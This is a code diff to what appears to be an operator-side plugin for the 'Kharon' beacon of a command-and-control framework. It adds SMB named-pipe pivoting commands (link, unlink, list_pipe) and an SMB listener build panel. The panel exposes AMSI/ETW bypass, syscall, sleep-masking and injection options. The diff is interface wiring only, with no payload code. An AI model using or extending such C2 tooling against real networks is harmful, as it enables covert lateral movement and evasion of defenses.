@@ -166,7 +166,8 @@ function RegisterCommands(listenerType)
     let cmd_config_subcommands = [
         cmd_config_sleep, cmd_config_jitter, cmd_config_ppid, cmd_config_blockdll, cmd_config_spoofarg, cmd_config_wkrtime,
         cmd_config_killdate_date, cmd_config_killdate_exit, cmd_config_killdate_selfdel,
-        cmd_config_heap_obf, cmd_config_mask, cmd_config_amsietwbypass, cmd_config_spawnto, cmd_config_syscall, cmd_config_bofproxy
+        cmd_config_heap_obf, cmd_config_mask, cmd_config_amsietwbypass, cmd_config_spawnto, cmd_config_syscall, cmd_config_bofproxy,
+        cmd_config_forkpipe
     ];
 
     let cmd_config = ax.create_command("config", "Configuration management - adjust beacon behavior and settings", "config sleep 50s");
@@ -234,14 +235,44 @@ function RegisterCommands(listenerType)
     let cmd_execute = ax.create_command("execute", "Execute Beacon Object Files or post-exploitation shellcode modules");
     cmd_execute.addSubCommands([cmd_exec_bof, cmd_exec_postex]);
 
+    /// LIST PIPE
+
+    let cmd_list_pipe = ax.create_command("list_pipe", "List named pipes on target (wildcard filter)", "list_pipe kharon", "Task: enumerate named pipes");
+    cmd_list_pipe.addArgString("filter", false, "Pipe name filter (substring match)");
+
+    /// LINK
+
+    let cmd_link_smb = ax.create_command("smb", "Link to a child beacon over SMB named pipe", "link smb 10.10.10.5", "Task: link SMB pivot");
+    cmd_link_smb.addArgString("target", true, "Target hostname or IP");
+    cmd_link_smb.addArgString("pipename", false, "Named pipe name (uses listener default if omitted)");
+
+    let cmd_link = ax.create_command("link", "Link to a child beacon for pivoting");
+    cmd_link.addSubCommands([cmd_link_smb]);
+
+    /// UNLINK
+
+    let cmd_unlink = ax.create_command("unlink", "Unlink a child pivot beacon", "unlink <agent_id>", "Task: unlink pivot");
+    cmd_unlink.addArgString("agent_id", true, "Agent ID of child to disconnect");
+
     if (listenerType == "KharonHTTP") {
         let commands_external = ax.create_commands_group("kharon", [
             cmd_info, cmd_config, cmd_exit, cmd_selfdel, cmd_execute,
             cmd_fs, cmd_ps, cmd_token, cmd_scinject, cmd_upload,
-            cmd_download, cmd_socks, cmd_rportfwd
+            cmd_download, cmd_socks, cmd_rportfwd,
+            cmd_link, cmd_unlink, cmd_list_pipe
         ]);
 
         return { commands_windows: commands_external }
+    }
+
+    if (listenerType == "KharonSMB") {
+        let commands_internal = ax.create_commands_group("kharon", [
+            cmd_info, cmd_config, cmd_exit, cmd_selfdel, cmd_execute,
+            cmd_fs, cmd_ps, cmd_token, cmd_scinject, cmd_upload,
+            cmd_download, cmd_link, cmd_unlink, cmd_list_pipe
+        ]);
+
+        return { commands_windows: commands_internal }
     }
 
     return ax.create_commands_group("none", []);
@@ -487,6 +518,58 @@ function GenerateUI(listenerType)
 
     let layout = form.create_gridlayout();
     layout.addWidget(root_tabs, 0, 0, 1, 1);
+
+    // SMB beacons: no sleep/jitter (parent controls timing via pipe), no PE Settings tab
+    if (listenerType == "KharonSMB") {
+        let layout_scroll_smb = form.create_gridlayout();
+        layout_scroll_smb.addWidget(labelFormat,        0, 0, 1, 1);
+        layout_scroll_smb.addWidget(comboFormat,        0, 1, 1, 1);
+        layout_scroll_smb.addWidget(guardrails_group,   1, 0, 1, 3);
+        layout_scroll_smb.addWidget(killdate_group,     2, 0, 1, 3);
+        layout_scroll_smb.addWidget(postex_group,       3, 0, 1, 3);
+        layout_scroll_smb.addWidget(evasion_group,      4, 0, 1, 3);
+        layout_scroll_smb.addWidget(mask_group,         5, 0, 1, 3);
+
+        let panel_scroll_smb = form.create_panel();
+        panel_scroll_smb.setLayout(layout_scroll_smb);
+        const scroll_smb = form.create_scrollarea();
+        scroll_smb.setPanel(panel_scroll_smb);
+        let layout_smb = form.create_gridlayout();
+        layout_smb.addWidget(scroll_smb, 0, 0, 1, 1);
+
+        let container_smb = form.create_container();
+        container_smb.put("format", comboFormat);
+        container_smb.put("sleep", textSleep);
+        container_smb.put("jitter", spinJitter);
+        container_smb.put("guardrails_ip", textGuardrailsIP);
+        container_smb.put("guardrails_hostname", textGuardrailsHostname);
+        container_smb.put("guardrails_user", textGuardrailsUser);
+        container_smb.put("guardrails_domain", textGuardrailsDomain);
+        container_smb.put("killdate_check", killdate_group);
+        container_smb.put("killdate_date", dateKill);
+        container_smb.put("fork_pipename", textPipename);
+        container_smb.put("spawnto", textSpawnTo);
+        container_smb.put("bypass", bypass_combo);
+        container_smb.put("bof_api_proxy", bof_api_check);
+        container_smb.put("syscall", syscall_combo);
+        container_smb.put("mask_heap", heap_obf_check);
+        container_smb.put("mask_sleep", sleep_mask_combo);
+
+        // PE/loader keys (required by pl_agent.go for Exe/Dll/Svc builds — defaults from hidden widgets)
+        container_smb.put("pe_section", section_combo);
+        container_smb.put("encryption_technique", encryption_combo);
+        container_smb.put("injection_technique", injection_combo);
+        container_smb.put("custom_section_name", textCustomSection);
+
+        let panel_smb = form.create_panel();
+        panel_smb.setLayout(layout_smb);
+        return {
+            ui_panel: panel_smb,
+            ui_container: container_smb,
+            ui_height: 800,
+            ui_width: 800
+        }
+    }
 
     let container = form.create_container();
     container.put("format",               comboFormat)
